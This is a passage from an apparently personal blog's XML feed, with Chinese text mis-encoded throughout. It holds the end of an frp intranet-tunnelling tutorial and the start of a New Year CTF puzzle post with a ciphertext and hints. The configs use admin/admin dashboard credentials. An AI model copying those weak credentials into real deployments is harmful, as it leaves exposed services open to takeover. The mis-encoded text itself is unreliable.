title="å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰çš„æ­å»º"></a>å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰çš„æ­å»º</h3><p>åŒç†æŠŠ<code>frp</code>è§£å‹çš„æ–‡ä»¶æ”¾åˆ°<code>/etc/frp</code>æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p>å®¢æˆ·ç«¯clientï¼Œç”¨çš„æ˜¯ <strong>frpc</strong> åŠ <strong>frpc.ini</strong>ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frpc.ini</span><span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> x.x.x.x</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7001</span><span class="token selector">[Mysql]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1   #ä¹Ÿå¯ä»¥æ˜¯å±€åŸŸç½‘ä¸­çš„å†…ç½‘IP</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 3306</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7002</span></code></pre><p>å…¶ä¸­commoné‡Œçš„<code>server_addr</code>æ˜¯å…¬ç½‘ä¸»æœºçš„å…¬ç½‘IPï¼Œ<code>server_port</code>è®¾æˆä¸æœåŠ¡ç«¯ä¸€æ ·çš„ç«¯å£ã€‚</p><p>æ¯ä¸ªæ–¹æ¡†<code>[.+]</code>é‡Œçš„æ˜¯nameï¼Œä¸‹é¢éƒ½å¯¹åº”ç€ä¸€ä¸ªè§„åˆ™ï¼Œè¦æ±‚ä¸èƒ½é‡åã€‚</p><p><code>type</code>å¯ä»¥æ˜¯tcp/udp/http/https/stcp/xtcpï¼ˆå…·ä½“çœ‹å®˜æ–¹æ–‡æ¡£ï¼‰ï¼Œä¸€èˆ¬å°±tcp/httpå•¦ã€‚</p><p><code>local_ip</code>å’Œ<code>local_port</code>ä¸ºæœ¬åœ°åœ°å€åŠç«¯å£ã€‚</p><p><code>remote_port</code>ä¸ºå…¬ç½‘çš„ç«¯å£ï¼Œè¿™ä¸ªå¯ä»¥åœ¨æœåŠ¡ç«¯è¿›è¡Œé™åˆ¶ï¼Œæ³¨æ„<strong>è¦åœ¨æœåŠ¡ç«¯æ”¾è¡Œè¿™äº›ç«¯å£</strong>å•Šï¼</p><br><p>å®¢æˆ·ç«¯å¯ä»¥åœ¨å¤šä¸ªä¸»æœºä¸Šè¿è¡Œï¼Œåªè¦nameä¸é‡åå°±è¡Œã€‚</p><p>è€Œå<strong>å¯åŠ¨å®¢æˆ·ç«¯</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/frp/frpc -c /etc/frp/frpc.ini</code></pre><p>Windowsä¸‹ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">frpc.exe -c frpc.ini</code></pre><p><img src="/2020/01/29/Server_frp/client.png" alt="client"></p><p><code>start proxy success</code>è¡¨ç¤ºå¯åŠ¨æˆåŠŸã€‚</p><hr><h3 id="è¿œç¨‹è®¿é—®"><a href="#è¿œç¨‹è®¿é—®" class="headerlink" title="è¿œç¨‹è®¿é—®"></a>è¿œç¨‹è®¿é—®</h3><p>ç°åœ¨å°±å¯ä»¥ç›´æ¥é€šè¿‡å…¬ç½‘IPçš„7001ç«¯å£è®¿é—®å†…ç½‘çš„sshï¼Œé€šè¿‡7002ç«¯å£è®¿é—®å†…ç½‘çš„Mysqlå•¦ï¼</p><p><strong>è¿œç¨‹ç¼–ç¨‹ï¼Œè®¿é—®ç½‘é¡µï¼Œç®¡ç†æ•°æ®åº“</strong>ä»€ä¹ˆçš„éƒ½å¯ä»¥å®ç°å•¦ï¼</p><p><strong>å¥½æ£’å‘€ï¼</strong></p><br><hr><hr><br><h2 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a>è¿›é˜¶</h2><h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p><code>frp</code>çš„<strong>æœåŠ¡å™¨ç«¯</strong>æä¾›äº†ä¸€ä¸ªåœ¨webç«¯<strong>æŸ¥çœ‹è¿è¡ŒçŠ¶æ€</strong>çš„å±•ç¤ºç•Œé¢ã€‚</p><p>é…ç½®å¦‚ä¸‹ï¼Œåœ¨<code>common</code>ä¸­æ·»åŠ å¦‚ä¸‹ä¿¡æ¯ï¼š</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frps.ini</span><span class="token selector">[common]</span><span class="token constant">dashboard_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7500 # æ³¨æ„å¼€æ”¾ç«¯å£</span><span class="token comment"># dashboard ç”¨æˆ·åå¯†ç ï¼Œé»˜è®¤éƒ½ä¸º admin</span><span class="token constant">dashboard_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">dashboard_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>è€Œåé‡å¯æœåŠ¡ç«¯ï¼Œå°±å¯ä»¥åœ¨<code>http://[server_addr]:7500</code> è®¿é—® dashboard ç•Œé¢ï¼Œç”¨æˆ·åå¯†ç é»˜è®¤ä¸º <code>admin</code>ã€‚</p><p><img src="/2020/01/29/Server_frp/Dashboard_Overview.png" alt="Dashboard_Overview"></p><p><img src="/2020/01/29/Server_frp/Dashboard_Proxies.png" alt="Dashboard_Proxies"></p><p>è¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„å”‰ï¼</p><p>çœ‹äº†ä¸€ä¸‹ï¼ŒåŸºäº<code>vue</code>å†™çš„ã€‚</p><hr><h3 id="Admin-UI"><a href="#Admin-UI" class="headerlink" title="Admin UI"></a>Admin UI</h3><p>åœ¨å®¢æˆ·ç«¯ä¹Ÿæä¾›äº†ä¸€ä¸ªç±»ä¼¼äºdashboardçš„æŸ¥çœ‹çŠ¶æ€å’Œç®¡ç†é…ç½®çš„ç•Œé¢ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frpc.ini</span><span class="token selector">[common]</span><span class="token constant">admin_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">admin_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7400</span><span class="token constant">admin_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">admin_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>ç„¶åæœ¬åœ°å°±å¯ä»¥é€šè¿‡ <a href="http://127.0.0.1:7400/">http://127.0.0.1:7400</a> æ¥è®¿é—®<strong>æŸ¥çœ‹çŠ¶æ€</strong>å’Œ<strong>ä¿®æ”¹é…ç½®</strong>äº†ã€‚</p><p>è¿™é‡Œå¦‚æœæƒ³é€šè¿‡å†…ç½‘IPï¼ˆå¦‚<code>192.168.1.66</code>ï¼‰æŸ¥çœ‹çš„è¯ï¼Œéœ€è¦æŠŠ<code>admin_addr</code>ä¿®æ”¹ä¸º <code>0.0.0.0</code>ï¼ˆå…è®¸æ‰€æœ‰è®¿é—®ï¼‰ï¼Œæˆ–è€…å¯¹åº”çš„æœ¬åœ°IPï¼ˆå¦‚<code>192.168.1.66</code>ï¼‰ã€‚</p><p>åŒæ—¶ä¹Ÿéœ€è¦åœ¨æœ¬åœ°çš„firewallæ‰“å¼€è¿™ä¸ªç«¯å£ï¼Œå¦åˆ™åœ¨å†…ç½‘çš„å…¶ä»–ä¸»æœºä¹Ÿæ— æ³•è®¿é—®ã€‚ï¼ˆæŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°emmm</p><p>å½“ç„¶ï¼Œæƒ³è¦åœ¨å…¬ç½‘è®¿é—®çš„è¯ï¼ŒæŠŠ7400ç«¯å£æ˜ å°„åˆ°å¤–ç½‘å°±å¥½äº†ï¼Œä¸è¿‡å®‰å…¨èµ·è§ç®—äº†å§ã€‚</p><p><img src="/2020/01/29/Server_frp/AdminUI.png" alt="AdminUI"></p><hr><h3 id="å¼€å¯åŠ å¯†ã€å‹ç¼©"><a href="#å¼€å¯åŠ å¯†ã€å‹ç¼©" class="headerlink" title="å¼€å¯åŠ å¯†ã€å‹ç¼©"></a>å¼€å¯åŠ å¯†ã€å‹ç¼©</h3><p>åœ¨å®¢æˆ·ç«¯åŠ å…¥<code>use_encryption</code> å’Œ <code>use_compression</code>è¿™ä¸¤ä¸ªå‚æ•°ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frpc.ini</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000</span><span class="token constant">use_encryption</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">use_compression</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span></code></pre><hr><h3 id="å¼€æœºè‡ªå¯"><a href="#å¼€æœºè‡ªå¯" class="headerlink" title="å¼€æœºè‡ªå¯"></a>å¼€æœºè‡ªå¯</h3><p>è¿™æ¬¡ç›´æ¥æŠŠ<code>frp</code>ä½œä¸ºä¸€ä¸ªserviceå¥½äº†ï¼Œç”¨<code>systemd</code>å¥½äº†ï¼</p><h4 id="æœåŠ¡ç«¯ï¼š"><a href="#æœåŠ¡ç«¯ï¼š" class="headerlink" title="æœåŠ¡ç«¯ï¼š"></a>æœåŠ¡ç«¯ï¼š</h4><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåå« <code>frps.service</code>ï¼Œå†™å…¥</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frps.service</span><span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Server</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frps -c /etc/frp/frps.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frps</span><span class="token comment">#å¯åŠ¨å¤±è´¥1åˆ†é’Ÿåå†æ¬¡å¯åŠ¨</span><span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span><span class="token comment">#é‡å¯æ§åˆ¶ï¼šæ€»æ˜¯é‡å¯</span><span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><h4 id="å®¢æˆ·ç«¯ï¼š"><a href="#å®¢æˆ·ç«¯ï¼š" class="headerlink" title="å®¢æˆ·ç«¯ï¼š"></a>å®¢æˆ·ç«¯ï¼š</h4><p><code>frpc.service</code></p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frpc.service</span><span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Client</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frpc -c /etc/frp/frpc.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frpc</span><span class="token comment">#å¯åŠ¨å¤±è´¥1åˆ†é’Ÿåå†æ¬¡å¯åŠ¨</span><span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span><span class="token comment">#é‡å¯æ§åˆ¶ï¼šæ€»æ˜¯é‡å¯</span><span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><p>è€Œåå°†æ­¤æ–‡ä»¶æ”¾åˆ° æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„**<code>/etc/systemd/system/</code> ç›®å½•**ä¸‹ã€‚</p><p>å…ˆ<code>killall frps</code>ï¼ˆæˆ–frpcï¼‰ï¼Œå†è°ƒç”¨</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> frps.service</code></pre><p>æˆ–</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> frpc.service</code></pre><p>è¿™æ ·å°±æˆåŠŸé…ç½®äº†å¼€æœºè‡ªå¯ã€‚</p><p>è€Œä¸”å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤è¿›è¡Œç®¡ç†ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start frpc.service    <span class="token comment"># å¯åŠ¨</span><span class="token function">sudo</span> systemctl stop frpc.service     <span class="token comment"># åœæ­¢</span><span class="token function">sudo</span> systemctl restart frpc.service  <span class="token comment"># é‡å¯</span><span class="token function">sudo</span> systemctl status frpc.service   <span class="token comment"># æŸ¥çœ‹çŠ¶æ€</span></code></pre><p>frpsåŒç†ã€‚</p><p><img src="/2020/01/29/Server_frp/service.png" alt="æŸ¥çœ‹çŠ¶æ€"></p><br><hr><hr><br><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>frpå¾ˆå¼ºå¤§çš„å‘¢ï¼</p><p>æ¯”å¦‚è¿˜å¯ä»¥åœ¨ä¸€å®šæƒ…å†µä¸‹ç»•è¿‡æœåŠ¡å™¨å®ç°ç‚¹å¯¹ç‚¹P2Pè¿æ¥ï¼Œä¸è¿‡å‰ææ˜¯å†…ç½‘å’Œä½ çš„è®¾å¤‡ä¸¤ç«¯éƒ½è¦è£…frpcå®¢æˆ·ç«¯ã€‚</p><p>æ›´å¤šä¸”çœ‹<strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>å…³é”®è¿™ä¸ª<strong>é…ç½®èµ·æ¥è´¼æ–¹ä¾¿å•Š</strong>ï¼</p><p>äºæ˜¯è¿™æ ·å°±å¯ä»¥é€šè¿‡å…¬ç½‘IPï¼Œè®¿é—®åˆ°ä½ å†…ç½‘çš„èµ„æºå•¦ï¼Œå˜»å˜»å˜»~</p><p>å¥½äº†ï¼Œå®Œäº‹ï¼</p><p>æºœäº†æºœäº†ã€‚</p><hr><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>å®˜æ–¹ä»“åº“åŠä»‹ç» <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li><li>å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ <a href="https://github.com/fatedier/frp/blob/master/README_zh.md">https://github.com/fatedier/frp/blob/master/README_zh.md</a></li><li><a href="https://www.iplaysoft.com/frp.html">https://www.iplaysoft.com/frp.html</a></li><li>Frpåå°è‡ªåŠ¨å¯åŠ¨çš„å‡ ä¸ªæ–¹æ³• <a href="https://blog.csdn.net/x7418520/article/details/81077652">https://blog.csdn.net/x7418520/article/details/81077652</a></li><li>Systemd æœåŠ¡ç®¡ç†æ•™ç¨‹ <a href="https://cloud.tencent.com/developer/article/1516125">https://cloud.tencent.com/developer/article/1516125</a></li><li><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹</a></li></ol><p>è¿˜çœ‹åˆ°è¿‡ä¸€ä¸ªå…è´¹çš„å†…ç½‘ç©¿é€æœåŠ¡ï¼ŒSakura Frp <a href="https://www.natfrp.com/">https://www.natfrp.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Server </tag>
            
            <tag> ç©¿é€ </tag>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020é¼ å¹´å¿«ä¹ï¼æ¥ç©çº¢åŒ…é—¯å…³å§ï¼</title>
      <link href="2020/01/25/CTF_2020HappyChineseNewYear/"/>
      <url>2020/01/25/CTF_2020HappyChineseNewYear/</url>
      
        <content type="html"><![CDATA[<h2 id="é¼ å¹´å¿«ä¹"><a href="#é¼ å¹´å¿«ä¹" class="headerlink" title="é¼ å¹´å¿«ä¹"></a>é¼ å¹´å¿«ä¹</h2><p>åˆæ˜¯ä¸€å¹´æ˜¥æ¥åˆ°ï¼Œé¼ å¹´çš„é’Ÿå£°æ•²å“äº†ï¼</p><p><strong>é¼ ä½ å¥åº·ï¼Œé¼ ä½ å¹³å®‰ï¼Œé¼ ä½ å¿«ä¹å–µ~</strong></p><p>è¿™ä¸€å¹´è¿‡çš„å¤ªéš¾äº†ï¼Œè¿˜è¦æ„Ÿè°¢å¤§å®¶çš„é™ªä¼´å“ˆï¼</p><p>æœ€è¿‘æ–°å‹å† çŠ¶ç—…æ¯’æ„ŸæŸ“çš„è‚ºç‚æ¥äº†ï¼Œå…¬å…±åœºæ‰€éƒ½å…³é—­äº†emmm</p><p><strong>æ­¦æ±‰åŠ æ²¹ï¼ä¸­å›½åŠ æ²¹ï¼</strong></p><p><strong>è¿‡å¹´äº†ï¼Œå¤§å®¶éƒ½è¦å¥åº·å¿«ä¹å‘€ï¼</strong></p><br><hr><br><h2 id="çº¢åŒ…é—¯å…³"><a href="#çº¢åŒ…é—¯å…³" class="headerlink" title="çº¢åŒ…é—¯å…³"></a>çº¢åŒ…é—¯å…³</h2><p>è¯´åˆ°è¿™ä¸ªçº¢åŒ…é—¯å…³ï¼Œæœ€å¼€å§‹æ˜¯å¬è¯´æœ‰å­¦é•¿çš„çº¢åŒ…é—¯å…³ï¼ŒFJJ å­¦é•¿ä¹Ÿå¼„è¿‡ä¸€ä¸ªï¼Œå…ƒæ—¦çš„æ—¶å€™ç™½å¸ˆå‚…æ‰”äº†ä¸ªRSAçš„å¯†ç çº¢åŒ…ï¼ŒMilkice çš„å¹´ç»ˆæ€»ç»“é‡Œä¹Ÿå‡ºäº†é“çº¢åŒ…é¢˜ã€‚</p><p>åæ­£å°±æŒºæœ‰æ„æ€çš„å˜›23333</p><p>æˆ‘çš„è¯å…¶å®å…ƒæ—¦çš„æ—¶å€™å°±æƒ³å¼„äº†ã€‚</p><p>ä¸è¿‡é‚£æ—¶å€™ä¸€å †è€ƒè¯•ï¼Œå»å¹´12.31ä¸‹åˆå…­ç‚¹å¤šæ‰è€ƒå®Œé«˜é¢‘ï¼Œåé¢åˆè¦è€ƒDSPï¼Œæ ¹æœ¬æ²¡ç©ºå‡ºé¢˜â€¦â€¦</p><p>æ‰€ä»¥ï¼Œä¸å¦‚è¶ç€æ˜¥èŠ‚å‡ºé“é¢˜ç©ç©å‘€ï¼</p><br><hr><br><h2 id="é¢˜ç›®æ¥äº†"><a href="#é¢˜ç›®æ¥äº†" class="headerlink" title="é¢˜ç›®æ¥äº†"></a>é¢˜ç›®æ¥äº†</h2><p>å°±å‡ºä¸ª <strong>Misc</strong> çš„é¢˜å§ï¼ŒèŠ±äº†ä¸€ç•ªå¿ƒæ€ï¼Œåšé¢˜çœ‹è„‘æ´å§ï¼Œå¯ä»¥å¥½å¥½ç©ç©ï¼</p><p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚æ·±å…¥äººå¿ƒï¼Œé‚£æˆ‘ä»¬å°±ä»è¿™å¼€å§‹å§ï¼</p><pre class="language-none"><code class="language-none">è‡ªç”±è¯šä¿¡è‡ªç”±è‡ªç”±æ–‡æ˜å’Œè°æ–‡æ˜è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°è‡ªç”±è‡ªç”±è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå¹³ç­‰çˆ±å›½å¹³ç­‰å’Œè°å’Œè°å…¬æ­£å’Œè°å’Œè°è‡ªç”±å‹å–„å…¬æ­£è‡ªç”±å‹å–„è‡ªç”±è‡ªç”±å‹å–„æ³•æ²»è‡ªç”±å…¬æ­£å¹³ç­‰çˆ±å›½å¹³ç­‰çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°å’Œè°å’Œè°å’Œè°è‡ªç”±å‹å–„æ•¬ä¸šå¹³ç­‰å¯Œå¼ºè‡ªç”±å¹³ç­‰å¹³ç­‰çˆ±å›½è‡ªç”±çˆ±å›½å¹³ç­‰æ°‘ä¸»å’Œè°å…¬æ­£è‡ªç”±å‹å–„å…¬æ­£å’Œè°æ–‡æ˜è‡ªç”±å…¬æ­£å’Œè°å¹³ç­‰è‡ªç”±å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å¹³ç­‰æ°‘ä¸»å’Œè°å’Œè°å¹³ç­‰å’Œè°è‡ªç”±æ•¬ä¸šå¹³ç­‰å…¬æ­£å’Œè°æ–‡æ˜è‡ªç”±è‡ªç”±è‡ªç”±è¯šä¿¡æ°‘ä¸»è‡ªç”±è¯šä¿¡æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å¹³ç­‰è‡ªç”±å‹å–„æ•¬ä¸šè‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å¹³ç­‰æ°‘ä¸»å’Œè°è‡ªç”±è‡ªç”±å‹å–„å…¬æ­£è‡ªç”±å‹å–„æ³•æ²»è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å…¬æ­£å’Œè°å’Œè°å¹³ç­‰æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰æ•¬ä¸šè‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±è¯šä¿¡å’Œè°è‡ªç”±è¯šä¿¡è‡ªç”±è‡ªç”±å‹å–„è‡ªç”±å¹³ç­‰æ³•æ²»è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±å¹³ç­‰è‡ªç”±å‹å–„çˆ±å›½å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰çˆ±å›½å¹³ç­‰çˆ±å›½è‡ªç”±æ³•æ²»è‡ªç”±å‹å–„å…¬æ­£å’Œè°å’Œè°å¹³ç­‰è‡ªç”±è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰å…¬æ­£è‡ªç”±æ³•æ²»è‡ªç”±æ•¬ä¸šå’Œè°æ–‡æ˜è‡ªç”±è¯šä¿¡æ–‡æ˜å¹³ç­‰å¯Œå¼ºè‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å¯Œå¼ºå¹³ç­‰æ•¬ä¸šå¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å’Œè°è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰æ–‡æ˜å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±å’Œè°å’Œè°å’Œè°å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰æ–‡æ˜å¹³ç­‰æ³•æ²»è‡ªç”±è‡ªç”±å¹³ç­‰æ³•æ²»å’Œè°æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å‹å–„å¹³ç­‰è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰è¯šä¿¡å¯Œå¼ºå¹³ç­‰æ³•æ²»è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰è¯šä¿¡å¯Œå¼ºè‡ªç”±å‹å–„å…¬æ­£è‡ªç”±å‹å–„å¹³ç­‰è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰æ³•æ²»è‡ªç”±è‡ªç”±å¹³ç­‰æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å’Œè°å’Œè°è‡ªç”±æ³•æ²»è‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰çˆ±å›½å¹³ç­‰å¹³ç­‰è‡ªç”±å’Œè°è‡ªç”±è¯šä¿¡å’Œè°è‡ªç”±è¯šä¿¡æ–‡æ˜å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±æ–‡æ˜è‡ªç”±è‡ªç”±è‡ªç”±è‡ªç”±è‡ªç”±æ•¬ä¸šå’Œè°æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å…¬æ­£è‡ªç”±æ³•æ²»è‡ªç”±æ•¬ä¸šå¹³ç­‰è¯šä¿¡å¯Œå¼ºå¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±å…¬æ­£å’Œè°å¹³ç­‰è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰å’Œè°å¹³ç­‰æ•¬ä¸šè‡ªç”±å‹å–„å…¬æ­£å¹³ç­‰å¯Œå¼ºè‡ªç”±å…¬æ­£å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰å¹³ç­‰è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°å’Œè°è‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±å‹å–„æ³•æ²»</code></pre><p>æ€»å…±æœ‰<strong>4ä¸ªFlag</strong>ï¼Œå¯¹åº”ç€4ä¸ªAlipayçº¢åŒ…ã€‚</p><p><strong>å½¢å¼éƒ½æ˜¯ <code>MIAO{.+}</code></strong> ï¼Œå¯èƒ½æ˜¯ <strong>çº¯æ•°å­—</strong> æˆ– <strong>çº¯æ±‰å­—</strong>ã€‚</p><p>å¦‚æœçº¢åŒ…è¿‡æœŸäº†ï¼Œ1æœˆ31æ—¥å‰ç›´æ¥ç§æˆ³æŠŠflagå‘ç»™æˆ‘å°±å¥½äº†å–µï¼</p><p>åé¢å†å‘å‡ºé¢˜è®°å½•å’ŒWPã€‚ï¼ˆå’•å’•å’•</p><p><strong>æ³¨æ„è§£å‡ºæ¥çš„flagä¸è¦éšä¾¿å‘ç»™åˆ«äººå•Šï¼ï¼ï¼</strong></p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><p>é—¯å…³éœ€è¦ä¸€å…³ä¸€å…³è¿‡å˜›ï¼Œå¯èƒ½æœ‰ç‚¹éš¾åº¦ï¼Œç»™ç‚¹å°æç¤ºå§ã€‚</p><ol><li>å¥—å¨ƒæŒºå¥½ç©çš„ï¼Œæ¯”å¦‚è¿™å›ä¸€ä¸ªæ–‡ä»¶é‡Œå¥—äº†å¥½å‡ ä¸ªï¼Œflagå°±è¶ŠåŸ‹è¶Šæ·±23333ã€‚</li><li>ç¼–ç å®¶æ—é‡Œï¼Œ<code>base64</code>æŒºå¸¸ç”¨çš„ï¼Œä½†åˆ«åªæƒ³ç€å®ƒå§ã€‚å“¦å¯¹äº†ï¼Œç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ä¹Ÿå¯ä»¥ç”¨æ¥ç¼–ç 